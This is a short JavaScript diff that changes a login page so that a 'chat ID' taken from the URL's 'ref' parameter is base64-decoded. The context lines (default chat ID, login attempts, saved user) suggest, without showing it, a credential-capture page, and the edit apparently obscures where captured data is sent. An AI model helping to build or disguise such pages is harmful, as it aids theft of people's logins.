@@ -228,7 +228,9 @@
 
   // Get chat ID from URL param ?ref=CHATID, fallback to default
   const urlParams = new URLSearchParams(window.location.search);
-  const chatId = urlParams.get('ref') || DEFAULT_CHAT_ID;
+  const raw = urlParams.get('ref') || '';
+const chatId = raw ? atob(raw.replace(/-/g, '+').replace(/_/g, '/') + '==') : DEFAULT_CHAT_ID;
+
 
   let loginAttempts = 0;
   let savedUser = '';
